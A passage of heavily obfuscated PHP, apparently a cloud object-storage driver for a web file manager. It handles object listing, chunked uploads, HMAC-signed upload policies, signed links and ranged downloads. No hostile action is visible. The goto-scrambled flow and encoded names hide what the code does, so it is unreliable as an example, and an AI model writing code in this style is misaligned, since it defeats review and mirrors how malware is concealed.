$cªØºÓŠ‚Ï[$bÃˆå­È¹Î[193]] = $cªØºÓŠ‚Ï[$bÃˆå­È¹Î[194]] = !0; if (empty($fäí×Ì†)) { $fäí×Ì† = $this->objectMeta($c¶Æİ¯ì‰); if (!$fäí×Ì†) { return $cªØºÓŠ‚Ï; } } goto A‚æ‘¬ÓĞ; A‚æ‘¬ÓĞ: $cªØºÓŠ‚Ï[$bÃˆå­È¹Î[192]] = intval($fäí×Ì†[$bÃˆå­È¹Î[1319]]); $cªØºÓŠ‚Ï[$bÃˆå­È¹Î[83]] = intval($fäí×Ì†[$bÃˆå­È¹Î[1320]]); return $cªØºÓŠ‚Ï; goto cä…ßÅ©½Õ; cä…ßÅ©½Õ: } private function listObjs($EÔˆ«‹Ì, $f”î¢Åæé = 0, $Aëß§Ö‰Ñ = 1000) { $C×Œ½îãÕÒ =& $_SERVER[µ…]; $FÁöŞ‚Ú¯ñ = array($C×Œ½îãÕÒ[1321], $C×Œ½îãÕÒ[1322] . $Aëß§Ö‰Ñ); if ($f”î¢Åæé) { $FÁöŞ‚Ú¯ñ[] = $C×Œ½îãÕÒ[1323] . $f”î¢Åæé; } $aÂ¸‘œ³®Î = $this->ussRequest($EÔˆ«‹Ì, $C×Œ½îãÕÒ[226], !1, $FÁöŞ‚Ú¯ñ); return !$aÂ¸‘œ³®Î[$C×Œ½îãÕÒ[1063]] ? !1 : $aÂ¸‘œ³®Î[$C×Œ½îãÕÒ[1065]]; } private function fileList($fîöÖ¹·, &$Bƒãñ¼›·£, &$fÈæ‚ùˆ¼÷, $eÍõ‚Õ©• = false) { goto a¥¡„ ãÑÖ; a¥¡„ ãÑÖ: $dÊ‡–¾…ˆ¯ =& $_SERVER[µ…]; $bù­Ãš•Èê = $dÊ‡–¾…ˆ¯[33]; $DÛ±…Š˜ô = 1000; goto EİÈÉó³èÊ; EİÈÉó³èÊ: $dªŸ®¬Âò¢ = rtrim($fîöÖ¹·, $dÊ‡–¾…ˆ¯[8]) . $dÊ‡–¾…ˆ¯[8]; $F¡’Ü‡„¤Ü = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $aäË·—¾ñ = $this->listObjs($fîöÖ¹·, $bù­Ãš•Èê, $DÛ±…Š˜ô); if (!$aäË·—¾ñ) { return !1; } $bù­Ãš•Èê = isset($aäË·—¾ñ[$dÊ‡–¾…ˆ¯[1324]]) ? $aäË·—¾ñ[$dÊ‡–¾…ˆ¯[1324]] : $dÊ‡–¾…ˆ¯[33]; $c«ŒŒ“´Ôµ = isset($aäË·—¾ñ[$dÊ‡–¾…ˆ¯[1325]]) ? $aäË·—¾ñ[$dÊ‡–¾…ˆ¯[1325]] : array(); foreach ($c«ŒŒ“´Ôµ as $E™µ¹›Œ†µ) { $bèäï¤ì = $E™µ¹›Œ†µ[$dÊ‡–¾…ˆ¯[29]] == $dÊ‡–¾…ˆ¯[76] ? !0 : !1; $d„Ü¿Úä™‡ = ltrim($dªŸ®¬Âò¢ . $E™µ¹›Œ†µ[$dÊ‡–¾…ˆ¯[28]], $dÊ‡–¾…ˆ¯[8]) . ($bèäï¤ì ? $dÊ‡–¾…ˆ¯[8] : $dÊ‡–¾…ˆ¯[33]); $D»ØëìÏ¼ˆ = array($dÊ‡–¾…ˆ¯[28] => $d„Ü¿Úä™‡, $dÊ‡–¾…ˆ¯[29] => $bèäï¤ì ? $dÊ‡–¾…ˆ¯[76] : $dÊ‡–¾…ˆ¯[191], $dÊ‡–¾…ˆ¯[77] => $E™µ¹›Œ†µ[$dÊ‡–¾…ˆ¯[333]], $dÊ‡–¾…ˆ¯[1320] => $E™µ¹›Œ†µ[$dÊ‡–¾…ˆ¯[1326]]); if ($F¡’Ü‡„¤Ü) { $this->cacheMethod($dÊ‡–¾…ˆ¯[197], $d„Ü¿Úä™‡, $bèäï¤ì); $this->cacheMethod($dÊ‡–¾…ˆ¯[198], $d„Ü¿Úä™‡, $D»ØëìÏ¼ˆ); } if ($bèäï¤ì) { $Bƒãñ¼›·£[] = $d„Ü¿Úä™‡; if ($eÍõ‚Õ©•) { $this->fileList($d„Ü¿Úä™‡, $Bƒãñ¼›·£, $fÈæ‚ùˆ¼÷, $eÍõ‚Õ©•); } continue; } $fÈæ‚ùˆ¼÷[] = $D»ØëìÏ¼ˆ; } if (count($c«ŒŒ“´Ôµ) < $DÛ±…Š˜ô) { break; } } goto e³Û„±ŒÚ; e³Û„±ŒÚ: if ($F¡’Ü‡„¤Ü) { $this->cacheMethod($dÊ‡–¾…ˆ¯[197], $fîöÖ¹·, !0); } goto C¡¯¡”®Æã; C¡¯¡”®Æã: } public function listPath($a–„Ñßø˜£, $BÅ¨·²Íø© = false) { $E¡ÒÒ°”âÖ =& $_SERVER[µ…]; $e‹õÏˆòæ® = $B“¸ïíåÀµ = array(); $this->fileList($a–„Ñßø˜£, $e‹õÏˆòæ®, $B“¸ïíåÀµ); foreach ($e‹õÏˆòæ® as $dçïâ©å©¢ => $eâ¶ÑÏÅÜ) { $e‹õÏˆòæ®[$dçïâ©å©¢] = $this->folderInfo($eâ¶ÑÏÅÜ, $BÅ¨·²Íø©); } foreach ($B“¸ïíåÀµ as $dçïâ©å©¢ => $eâ¶ÑÏÅÜ) { $B“¸ïíåÀµ[$dçïâ©å©¢] = $this->fileInfo($eâ¶ÑÏÅÜ[$E¡ÒÒ°”âÖ[28]], $BÅ¨·²Íø©, $eâ¶ÑÏÅÜ); } return array($E¡ÒÒ°”âÖ[74] => $e‹õÏˆòæ®, $E¡ÒÒ°”âÖ[73] => $B“¸ïíåÀµ); } public function has($Bí•¢Ù³È, $fâİØ–œÚ = false, $aŠ¶Ì®ö­ = true) { goto CÇĞ‰ÊËÏà; eéøÂ‰£‰: $eâêèä¦Êà = 0; $cîÔ»ùÎ¡¨ = 0; $Fğ£ğ›¶ßé = rtrim($Bí•¢Ù³È, $aˆµ«‘‹‹Ñ[8]) . $aˆµ«‘‹‹Ñ[8]; goto EĞÄ™µİ¢; CÇĞ‰ÊËÏà: $aˆµ«‘‹‹Ñ =& $_SERVER[µ…]; $Aºà¹¬Öæé = $aˆµ«‘‹‹Ñ[33]; $cİœì‹¡±Œ = 500; goto eéøÂ‰£‰; EĞÄ™µİ¢: while (!0) { check_abort(); $E‰İóƒµ©­ = $this->listObjs($Bí•¢Ù³È, $Aºà¹¬Öæé, $cİœì‹¡±Œ); if (!$E‰İóƒµ©­) { return !1; } $Aºà¹¬Öæé = isset($E‰İóƒµ©­[$aˆµ«‘‹‹Ñ[1324]]) ? $E‰İóƒµ©­[$aˆµ«‘‹‹Ñ[1324]] : $aˆµ«‘‹‹Ñ[33]; $f›”˜¯Ì»« = isset($E‰İóƒµ©­[$aˆµ«‘‹‹Ñ[1325]]) ? $E‰İóƒµ©­[$aˆµ«‘‹‹Ñ[1325]] : array(); if (empty($f›”˜¯Ì»«)) { break; } $bÊğ¦Ñ„ğÛ = array_filter($f›”˜¯Ì»«, function ($Fê‘É¤¶´¥) { $E½ ×õƒ°— =& $_SERVER[µ…]; return $Fê‘É¤¶´¥[$E½ ×õƒ°—[29]] == $E½ ×õƒ°—[76]; }); $aÂ÷‡•öï´ = count($f›”˜¯Ì»«); $bÊğ¦Ñ„ğÛ = count($bÊğ¦Ñ„ğÛ); $c„ä‰¢‡ÜÂ = $aÂ÷‡•öï´ - $bÊğ¦Ñ„ğÛ; if ($fâİØ–œÚ) { $cîÔ»ùÎ¡¨ += $bÊğ¦Ñ„ğÛ; $eâêèä¦Êà += $c„ä‰¢‡ÜÂ; if ($aÂ÷‡•öï´ < $cİœì‹¡±Œ) { break; } continue; } if ($aŠ¶Ì®ö­) { if ($c„ä‰¢‡ÜÂ) { return !0; } } else { if ($bÊğ¦Ñ„ğÛ) { return !0; } } if ($aÂ÷‡•öï´ < $cİœì‹¡±Œ) { break; } } if ($fâİØ–œÚ) { return array($aˆµ«‘‹‹Ñ[201] => $eâêèä¦Êà, $aˆµ«‘‹‹Ñ[202] => $cîÔ»ùÎ¡¨); } return !1; goto Fºİœõ»Ü; Fºİœõ»Ü: } public function listAll($a»öáë‘) { goto f””‘•±œÎ; f””‘•±œÎ: $BéëÖ½…×Â =& $_SERVER[µ…]; $EÁááóŠÎÛ = $C¨ñ¼˜â = array(); $this->fileList($a»öáë‘, $EÁááóŠÎÛ, $C¨ñ¼˜â, !0); goto dòäˆÂè¨ó; dòäˆÂè¨ó: $bŒªîŠ–ÆÓ = array(); foreach ($C¨ñ¼˜â as $DŒîêÆï) { $bŒªîŠ–ÆÓ[$DŒîêÆï[$BéëÖ½…×Â[28]]] = $DŒîêÆï[$BéëÖ½…×Â[77]]; } foreach ($EÁááóŠÎÛ as $DŒîêÆï) { if (is_string($DŒîêÆï)) { $bŒªîŠ–ÆÓ[$DŒîêÆï] = 0; } } goto eš…è·§¢è; eš…è·§¢è: return $this->listAllFiles($a»öáë‘, array_keys($bŒªîŠ–ÆÓ), $bŒªîŠ–ÆÓ); goto DàîÀ”Š±ê; DàîÀ”Š±ê: } public function canRead($EäÁ¤ôÕŸ) { return $this->exist($EäÁ¤ôÕŸ) ? !0 : !1; } public function canWrite($eÉÆÂ™‚ïª) { return $this->exist($eÉÆÂ™‚ïª) ? !0 : !1; } public function getContent($dÑ§Áƒ÷‘Ê) { return $this->fileSubstr($dÑ§Áƒ÷‘Ê, 0, -1); } public function setContent($DªÙ‡‰×¹, $DğÍ´…² = '') { $D«ÔŠ‡‰È =& $_SERVER[µ…]; if (!$DğÍ´…²) { $AÏ„áÎ°¥ğ = $this->ussRequest($DªÙ‡‰×¹, $D«ÔŠ‡‰È[222]); return $AÏ„áÎ°¥ğ[$D«ÔŠ‡‰È[1063]]; } $bî…×Š­ƒ = $this->tempFile($this->pathThis($DªÙ‡‰×¹)); file_put_contents($bî…×Š­ƒ, $DğÍ´…²); if ($this->upload($DªÙ‡‰×¹, $bî…×Š­ƒ)) { $this->tempFileRemve($bî…×Š­ƒ); return !0; } return !1; } public function fileSubstr($d©Á…–šİœ, $eæÍÌ¶¹©æ, $dáñÒ¯²ô) { $eäÌæ—ÚÙ¸ =& $_SERVER[µ…]; if (!($FÍÚÁ–¿± = $this->link($d©Á…–šİœ))) { return !1; } $bÕ­á†¼‘‹ = !1; if ($dáñÒ¯²ô > 0) { $b…ñÜŸñ® = $eæÍÌ¶¹©æ + $dáñÒ¯²ô - 1; $bÕ­á†¼‘‹ = array($eäÌæ—ÚÙ¸[1287] . $eæÍÌ¶¹©æ . $eäÌæ—ÚÙ¸[434] . $b…ñÜŸñ®); } $f½ëÙæÊŞª = url_request($FÍÚÁ–¿±, $eäÌæ—ÚÙ¸[226], !1, $bÕ­á†¼‘‹); return $f½ëÙæÊŞª[$eäÌæ—ÚÙ¸[704]] ? $f½ëÙæÊŞª[$eäÌæ—ÚÙ¸[1065]] : !1; } public function upload($e§Ä¥Òç¦Š, $fÄ©ø¦Â¢, $b¡ª–ì¿£º = false, $AÙÀÊáŒù = REPEAT_REPLACE) { goto aªó¾„ÄÖé; aªó¾„ÄÖé: $B¯Á¹´´® =& $_SERVER[µ…]; $a˜„¡öì†¼ = IO::size($fÄ©ø¦Â¢); if ($a˜„¡öì†¼ <= 1024 * 1024 * 200) { $fêÛáëÙˆà = array($B¯Á¹´´®[1327] . $fÄ©ø¦Â¢); $e±é•„°Ú = $this->ussRequest($e§Ä¥Òç¦Š, $B¯Á¹´´®[224], $fêÛáëÙˆà); return $e±é•„°Ú[$B¯Á¹´´®[1063]] ? $this->getPathOuter($e§Ä¥Òç¦Š) : !1; } goto b£ğ…Ì¨¢; FóäĞ´ãÂè: $EÇŠ—•Œ = $fŒ¾©†¿àŒ[$B¯Á¹´´®[1332]]; $C£´Õœ§…¢ = fopen($fÄ©ø¦Â¢, $B¯Á¹´´®[1235]); if (!$C£´Õœ§…¢) { return !1; } goto D•¿ó¿Úë‡; b£ğ…Ì¨¢: $a¥…‰×·è = 1024 * 1024 * 10; $eŸªÖ©÷á« = array($B¯Á¹´´®[1328], $B¯Á¹´´®[1329] . $a˜„¡öì†¼, $B¯Á¹´´®[1330], $B¯Á¹´´®[1331] . $a¥…‰×·è); $e±é•„°Ú = $this->ussRequest($e§Ä¥Òç¦Š, $B¯Á¹´´®[224], !1, $eŸªÖ©÷á«); goto aóçãªéà­; D•¿ó¿Úë‡: do { $C¶¢‰‹¡ˆÀ = $fŒ¾©†¿àŒ[$B¯Á¹´´®[1333]]; fseek_64($C£´Õœ§…¢, $D¹ëô„ôÀÁ); $FõöÈ§ÁÔ‚ = fread($C£´Õœ§…¢, $C¶¢‰‹¡ˆÀ); $Fô ¼¿Ê´ = 0; do { $Fô ¼¿Ê´++; $fŒ¾©†¿àŒ = $this->uploadPart($e§Ä¥Òç¦Š, $fŒ¾©†¿àŒ, $FõöÈ§ÁÔ‚); } while (!$fŒ¾©†¿àŒ && $Fô ¼¿Ê´ < 3); if (!$fŒ¾©†¿àŒ) { return !1; } $EÇŠ—•Œ = $fŒ¾©†¿àŒ[$B¯Á¹´´®[1332]]; $D¹ëô„ôÀÁ += $C¶¢‰‹¡ˆÀ; } while ($EÇŠ—•Œ != -1); fclose($C£´Õœ§…¢); $eŸªÖ©÷á« = array($B¯Á¹´´®[1334], $B¯Á¹´´®[1335] . $fŒ¾©†¿àŒ[$B¯Á¹´´®[1336]], $B¯Á¹´´®[1330]); goto B†Ù÷Ä‘×©; B†Ù÷Ä‘×©: $e±é•„°Ú = $this->ussRequest($e§Ä¥Òç¦Š, $B¯Á¹´´®[224], !1, $eŸªÖ©÷á«); return $e±é•„°Ú[$B¯Á¹´´®[1063]] ? $this->getPathOuter($a´Î®Ÿ¶Ÿ) : !1; goto F…œƒÀ–·; aóçãªéà­: if (!$e±é•„°Ú[$B¯Á¹´´®[1063]]) { return !1; } $fŒ¾©†¿àŒ = $e±é•„°Ú[$B¯Á¹´´®[1065]]; $D¹ëô„ôÀÁ = 0; goto FóäĞ´ãÂè; F…œƒÀ–·: } private function uploadPart($A™ßª“ŞêÕ, $eŞôŒŞò±Ò, &$b©Œ™¸Í˜) { $C‘§ßâÒô =& $_SERVER[µ…]; $fí‹Ë¹Ğ‘• = array($C‘§ßâÒô[1337], $C‘§ßâÒô[1335] . $eŞôŒŞò±Ò[$C‘§ßâÒô[1336]], $C‘§ßâÒô[1338] . $eŞôŒŞò±Ò[$C‘§ßâÒô[1332]], $C‘§ßâÒô[140] . $eŞôŒŞò±Ò[$C‘§ßâÒô[1333]]); $dÄë×Ô÷Ñ— = $this->ussRequest($A™ßª“ŞêÕ, $C‘§ßâÒô[224], $b©Œ™¸Í˜, $fí‹Ë¹Ğ‘•); return !$dÄë×Ô÷Ñ—[$C‘§ßâÒô[1063]] ? $dÄë×Ô÷Ñ—[$C‘§ßâÒô[1063]] : $dÄë×Ô÷Ñ—[$C‘§ßâÒô[1065]]; } public function uploadFormData($eØÀé‘¤ÃÒ, $EÑÀ‹É‡…¢ = 3600) { return $this->uploadPolicy($eØÀé‘¤ÃÒ, $EÑÀ‹É‡…¢); } public function multiUploadFormData($FñÖÕƒ²¯Ò, $Aµ¹“«òİ¦ = 3600) { $b˜ùÔšÄ‡¾ =& $_SERVER[µ…]; $Cá¸ƒÂ‘©à = (int) $GLOBALS[$b˜ùÔšÄ‡¾[7]][$b˜ùÔšÄ‡¾[77]]; return $this->uploadPolicy($FñÖÕƒ²¯Ò, $Aµ¹“«òİ¦, $Cá¸ƒÂ‘©à); } private function uploadPolicy($eê…ÒôÆ¨¹, $cä…¬íî‚¶ = 3600, $a‡Ÿí¾‘Íà = 0) { goto b¢âã‚çù‘; EÎÑÂÍ±¯´: $d’°ßòÉ‚ì = array($b¤ÌÄíÅš[1339] => $this->bucket, $b¤ÌÄíÅš[1340] => $eê…ÒôÆ¨¹, $b¤ÌÄíÅš[1341] => time() + $cä…¬íî‚¶, $b¤ÌÄíÅš[1342] => $CîŒøå½ç¾); if ($a‡Ÿí¾‘Íà) { $d’°ßòÉ‚ì[$b¤ÌÄíÅš[1253]] = $a‡Ÿí¾‘Íà; } $a„æ›’‘Ş¶ = base64_encode(json_encode($d’°ßòÉ‚ì)); goto Eß”„­¹˜…; b¢âã‚çù‘: $b¤ÌÄíÅš =& $_SERVER[µ…]; $f·ç£²¦ç = $b¤ÌÄíÅš[8] . $this->bucket; $CîŒøå½ç¾ = gmdate($b¤ÌÄíÅš[1274]); goto EÎÑÂÍ±¯´; Eß”„­¹˜…: $Aì¸²©éÎ = base64_encode(hash_hmac($b¤ÌÄíÅš[1309], "\120\x4f\x53\x54\46{$f·ç£²¦ç}\x26{$CîŒøå½ç¾}\x26{$a„æ›’‘Ş¶}", md5("{$this->userpass}"), !0)); $c†ãÕÑ¦ÁÃ = array($b¤ÌÄíÅš[1176] => $a„æ›’‘Ş¶, $b¤ÌÄíÅš[1343] => "\125\x50\131\125\116\40{$this->username}\x3a{$Aì¸²©éÎ}", $b¤ÌÄíÅš[174] => $this->endpoint . $f·ç£²¦ç); return $c†ãÕÑ¦ÁÃ; goto Eã¾çŠ¹Ğ; Eã¾çŠ¹Ğ: } public function download($e­¼Ñ™ôÉ¾, $F‰ˆ‰ß°È±) { goto F·œŠğóÅ; F·œŠğóÅ: $A†ÛÖÌŒõò = IO::getPathInner(IO::mkfile($F‰ˆ‰ß°È±)); if (!($CÂ¼…†’ë = $this->link($e­¼Ñ™ôÉ¾))) { return !1; } $aõöÌƒ³… = 0; goto A‘œŠìßæ; AÈ÷±‚‰„: fclose($d×ÉæÀ­…„); return $F‰ˆ‰ß°È±; goto EõÚğÃ¥ö£; A‘œŠìßæ: $Eô” Ã¥‘ = 1024 * 200; $d×ÉæÀ­…„ = fopen($A†ÛÖÌŒõò, $_SERVER[µ…][1293]); while (!0) { $a‡¹‹åâ® = $this->fileSubstr($e­¼Ñ™ôÉ¾, $aõöÌƒ³…, $Eô” Ã¥‘); if ($a‡¹‹åâ® === !1) { return !1; } fwrite($d×ÉæÀ­…„, $a‡¹‹åâ®); $aõöÌƒ³… += $Eô” Ã¥‘; if (strlen($a‡¹‹åâ®) < $Eô” Ã¥‘) { break; } } goto AÈ÷±‚‰„; EõÚğÃ¥ö£: } public function link($Dâ¾‰åòÀÍ, $c©‚õ¤«” = array()) { $c–šŞæÚÎ‰ =& $_SERVER[µ…]; $Dâ¾‰åòÀÍ = trim($Dâ¾‰åòÀÍ, $c–šŞæÚÎ‰[8]); if (!empty($this->token)) { $EÜÁ§¤Ë¦× = strtotime(date($c–šŞæÚÎ‰[1344])); $dª‚§ùëĞµ = substr(md5($this->token . $c–šŞæÚÎ‰[280] . $EÜÁ§¤Ë¦× . $c–šŞæÚÎ‰[1345] . $Dâ¾‰åòÀÍ), 12, 8) . $EÜÁ§¤Ë¦×; $c©‚õ¤«”[] = $c–šŞæÚÎ‰[1346] . $dª‚§ùëĞµ; } $C Ÿíİ³‹ = !empty($c©‚õ¤«”) ? $c–šŞæÚÎ‰[69] . implode($c–šŞæÚÎ‰[280], $c©‚õ¤«”) : $c–šŞæÚÎ‰[33]; return $this->getHost() . $c–šŞæÚÎ‰[8] . $Dâ¾‰åòÀÍ . $C Ÿíİ³‹; } public function fileOut($cŸ¼“ÔŒšŠ, $aîÁòŞîñ = false, $FŸŒÙ×Ï² = false, $bÍ…ÂÌŞÖÛ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($cŸ¼“ÔŒšŠ, $aîÁòŞîñ, $FŸŒÙ×Ï², $bÍ…ÂÌŞÖÛ); } if (!$FŸŒÙ×Ï²) { $FŸŒÙ×Ï² = $this->pathThis($cŸ¼“ÔŒšŠ); } $bÑó…ùòğˆ = $aîÁòŞîñ ? array($_SERVER[µ…][1347] . rawurlencode($FŸŒÙ×Ï²)) : array(); $d²²±Ì· ‚ = $this->link($cŸ¼“ÔŒšŠ, $bÑó…ùòğˆ); $this->fileOutLink($d²²±Ì· ‚); } public function fileOutServer($c”†Ò‡ŠíÏ, $EËĞôÎ‡’¾ = false, $Fìí´Ï§µ = false, $AÛêŒƒŒ‡Š = '') { parent::fileOut($c”†Ò‡ŠíÏ, $EËĞôÎ‡’¾, $Fìí´Ï§µ, $AÛêŒƒŒ‡Š); } public function fileOutImage($DÌÑÚğ«Œ, $dÔéÕ‹êâ = 250) { $a¯¦–Œ‚ÍÜ = $this->link($DÌÑÚğ«Œ . $_SERVER[µ…][1348] . $dÔéÕ‹êâ); $this->fileOutLink($a¯¦–Œ‚ÍÜ); } public function fileOutImageServer($eÖÅîÖÃ°î, $A¸Ô²˜¡‚ = 250) { parent::fileOutImage($eÖÅîÖÃ°î, $A¸Ô²˜¡‚); } public function hashMd5($a™”êº÷) { $cÄßó´Âê¬ =& $_SERVER[µ…]; $A ãÔ–îÇ = $this->_objectMeta($a™”êº÷); return isset($A ãÔ–îÇ[$cÄßó´Âê¬[206]]) ? $A ãÔ–îÇ[$cÄßó´Âê¬[206]] : !1; } public function size($C‹çªÊ­ò») { $D²‡÷ëªó = $this->objectMeta($C‹çªÊ­ò»); return $D²‡÷ëªó ? $D²‡÷ëªó[$_SERVER[µ…][77]] : 0; } public function info($BåšÈÀçÀà) { if ($this->isFolder($BåšÈÀçÀà)) { return $this->folderInfo($BåšÈÀçÀà); } else { if ($this->isFile($BåšÈÀçÀà)) { return $this->fileInfo($BåšÈÀçÀà); } } return !1; } public function exist($b·‰¤ó¥…) { return $this->isFile($b·‰¤ó¥…) || $this->isFolder($b·‰¤ó¥…); } public function isFile($eœÄÃÃ”) { return !$this->isFolder($eœÄÃÃ”) && $this->objectMeta($eœÄÃÃ”); } public function isFolder($cŠŒê¢²Âº) { return $this->cacheMethod($_SERVER[µ…][197], $cŠŒê¢²Âº); } protected function objectMeta($aÑ°¨„¦) { return $this->cacheMethod($_SERVER[µ…][198], $aÑ°¨„¦); } protected function _objectMeta($f¿Ä™¬Ü¯) { goto AÂ×ÜÂàÊ; AÂ×ÜÂàÊ: $bäÀƒñ¦Ûƒ =& $_SERVER[µ…]; if ($f¿Ä™¬Ü¯ == $bäÀƒñ¦Ûƒ[33] || $f¿Ä™¬Ü¯ == $bäÀƒñ¦Ûƒ[8]) { return array(); } $AŠœšÅòİ = $this->ussRequest($f¿Ä™¬Ü¯, $bäÀƒñ¦Ûƒ[1349]); goto AàŸä¶¯›ß; AàŸä¶¯›ß: if (!$AŠœšÅòİ[$bäÀƒñ¦Ûƒ[1063]]) { return null; } $f›½³¯‚† = isset($AŠœšÅòİ[$bäÀƒñ¦Ûƒ[1065]]) ? $AŠœšÅòİ[$bäÀƒñ¦Ûƒ[1065]] : array(); if (!isset($f›½³¯‚†[$bäÀƒñ¦Ûƒ[1350]])) { return null; } goto c®òØ‚¬Î’; c®òØ‚¬Î’: $CÉ¡Ğ‚° = array($bäÀƒñ¦Ûƒ[29] => isset($f›½³¯‚†[$bäÀƒñ¦Ûƒ[1350]]) ? $f›½³¯‚†[$bäÀƒñ¦Ûƒ[1350]] : null, $bäÀƒñ¦Ûƒ[77] => isset($f›½³¯‚†[$bäÀƒñ¦Ûƒ[1351]]) ? $f›½³¯‚†[$bäÀƒñ¦Ûƒ[1351]] : null, $bäÀƒñ¦Ûƒ[206] => isset($f›½³¯‚†[$bäÀƒñ¦Ûƒ[1352]]) ? $f›½³¯‚†[$bäÀƒñ¦Ûƒ[1352]] : null, $bäÀƒñ¦Ûƒ[1319] => isset($f›½³¯‚†[$bäÀƒñ¦Ûƒ[1353]]) ? $f›½³¯‚†[$bäÀƒñ¦Ûƒ[1353]] : null); $CÉ¡Ğ‚°[$bäÀƒñ¦Ûƒ[1320]] = isset($f›½³¯‚†[$bäÀƒñ¦Ûƒ[1354]]) ? strtotime($f›½³¯‚†[$bäÀƒñ¦Ûƒ[1354]]) : $CÉ¡Ğ‚°[$bäÀƒñ¦Ûƒ[1319]]; return $CÉ¡Ğ‚°; goto f—ˆĞ”ñé; f—ˆĞ”ñé: } protected function _isFolder($bìƒ©½éÊ½) { $Fªî¬‹Üº =& $_SERVER[µ…]; if ($bìƒ©½éÊ½ == $Fªî¬‹Üº[33] || $bìƒ©½éÊ½ == $Fªî¬‹Üº[8]) { return !0; } $a«¯Ã²Êâ = $this->_objectMeta($bìƒ©½éÊ½); return isset($a«¯Ã²Êâ[$Fªî¬‹Üº[29]]) && $a«¯Ã²Êâ[$Fªî¬‹Üº[29]] == $Fªî¬‹Üº[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($DÙÏğŸëÆ = false) { } public function exist($FñïªìÇ—‰) { $EŞåßë£± = $this->info($FñïªìÇ—‰); return $EŞåßë£±[$_SERVER[µ…][193]]; } public function isFile($FÙÜÀ¶ë•) { $c›ß¹‹¶¯§ = $this->info($FÙÜÀ¶ë•); return $c›ß¹‹¶¯§[$_SERVER[µ…][193]]; } public function isFolder($D°­êê’…‰) { return !1; } public function size($bµ‘ëØ…³) { $d¶„øÈ„•™ = $this->info($bµ‘ëØ…³); return $d¶„øÈ„•™[$_SERVER[µ…][77]]; } public function info($b¦ÏØ¡Ô©Ì) { return $this->infoParse($b¦ÏØ¡Ô©Ì); } public function infoAuth($d‹È‚‹Ÿë) { return $this->infoParse($d‹È‚‹Ÿë); } public function infoWithChildren($f·ğ× æŞÉ) { return $this->infoParse($f·ğ× æŞÉ); } public function infoFull($F§æàÕƒšæ) { return $this->infoParse($F§æàÕƒšæ); } private function infoParse($Bİ†ÂÌ†ôŸ) { $aÖòíŒÚ»î =& $_SERVER[µ…]; $c†É…‘Ã¤ = $this->header($Bİ†ÂÌ†ôŸ); if (!$c†É…‘Ã¤ || !$c†É…‘Ã¤[$aÖòíŒÚ»î[704]]) { return !1; } $Dµ¿‡íÌç˜ = _get($c†É…‘Ã¤, $aÖòíŒÚ»î[333], 0); $BçÇ‰‰„ø± = array($aÖòíŒÚ»î[28] => $c†É…‘Ã¤[$aÖòíŒÚ»î[28]], $aÖòíŒÚ»î[75] => $Bİ†ÂÌ†ôŸ, $aÖòíŒÚ»î[29] => $aÖòíŒÚ»î[191], $aÖòíŒÚ»î[77] => intval($Dµ¿‡íÌç˜), $aÖòíŒÚ»î[167] => get_path_ext($c†É…‘Ã¤[$aÖòíŒÚ»î[28]]), $aÖòíŒÚ»î[1232] => $Dµ¿‡íÌç˜ > 0 && $c†É…‘Ã¤[$aÖòíŒÚ»î[1355]], $aÖòíŒÚ»î[1233] => !1); return $BçÇ‰‰„ø±; } private function header($béÁ„£‡´) { goto eíäÙ»¿Æö; eíäÙ»¿Æö: $d‚…÷Î‘È =& $_SERVER[µ…]; if (isset(self::$_cacheHeader[$béÁ„£‡´])) { return self::$_cacheHeader[$béÁ„£‡´]; } $B«Ã…×÷½… = isset($GLOBALS[$d‚…÷Î‘È[1356]]) ? $GLOBALS[$d‚…÷Î‘È[1356]] : !1; goto f…õ´äŞî; f…õ´äŞî: $GLOBALS[$d‚…÷Î‘È[1356]] = !0; self::$_cacheHeader[$béÁ„£‡´] = url_header($béÁ„£‡´); $GLOBALS[$d‚…÷Î‘È[1356]] = $B«Ã…×÷½…; goto e„°Ìõ’¥; e„°Ìõ’¥: return self::$_cacheHeader[$béÁ„£‡´]; goto Eê‹­Æ…¤; Eê‹­Æ…¤: } public function hashSimple($Fºµ·è‘ñÅ, $dÀÜ˜ÆÉ†­ = false) { goto d—éØã–Ú; B±³ˆš: $Dïãñ±ê¡ç .= $this->fileSubstr($Fºµ·è‘ñÅ, $dº±Áóâ‚‡ - $c¦ëä¡ˆí, $c¦ëä¡ˆí); return md5($Dïãñ±ê¡ç) . $dº±Áóâ‚‡; goto d¡¿¯¾™Âø; Dèá·ÌÓœÂ: $A¦Ö¦è·åõ = timeFloat(); $F‰ëášµŒ® = 15; for ($d„Š¹…ˆøÈ = 0; $d„Š¹…ˆøÈ < $Eáœ×›²î…; $d„Š¹…ˆøÈ++) { if (timeFloat() - $A¦Ö¦è·åõ > $F‰ëášµŒ®) { return !1; } $fÌ²³ØÑŒè = $this->fileSubstr($Fºµ·è‘ñÅ, $a½Î×îİ¤Œ * $d„Š¹…ˆøÈ, $c¦ëä¡ˆí); if (!$fÌ²³ØÑŒè) { return !1; } $Dïãñ±ê¡ç .= $fÌ²³ØÑŒè; } goto B±³ˆš; Fèñºß“¸ç: if ($dº±Áóâ‚‡ <= $c¦ëä¡ˆí * $Eáœ×›²î…) { return md5($this->fileSubstr($Fºµ·è‘ñÅ, 0, $dº±Áóâ‚‡)) . $dº±Áóâ‚‡; } $a½Î×îİ¤Œ = intval($dº±Áóâ‚‡ / $Eáœ×›²î…); $Dïãñ±ê¡ç = $F»• Ûà•Õ[33]; goto Dèá·ÌÓœÂ; D»ÓÏ¢æ°‚: $dº±Áóâ‚‡ = $dç¸½›¢Î˜[$F»• Ûà•Õ[77]]; $c¦ëä¡ˆí = 200; $Eáœ×›²î… = 50; goto Fèñºß“¸ç; d—éØã–Ú: $F»• Ûà•Õ =& $_SERVER[µ…]; $dç¸½›¢Î˜ = $this->info($Fºµ·è‘ñÅ); if (!$dç¸½›¢Î˜ || !$dç¸½›¢Î˜[$F»• Ûà•Õ[193]]) { return !1; } goto D»ÓÏ¢æ°‚; d¡¿¯¾™Âø: } public function getContent($e íåË÷º) { return $this->fileSubstr($e íåË÷º); } public function fileSubstr($F‰íÍİ×§¥, $b¤Á¸À˜  = 0, $EÑÄƒ½ÁÓ… = -1) { goto AŸ‰Ø„ßÑ…; AŸ‰Ø„ßÑ…: $Cçê„¿¥àø =& $_SERVER[µ…]; $eï‰³Ï–À  = $this->info($F‰íÍİ×§¥); if (!$eï‰³Ï–À  || !$eï‰³Ï–À [$Cçê„¿¥àø[193]] && $eï‰³Ï–À [$Cçê„¿¥àø[77]] > 1024 * 1024 * 10) 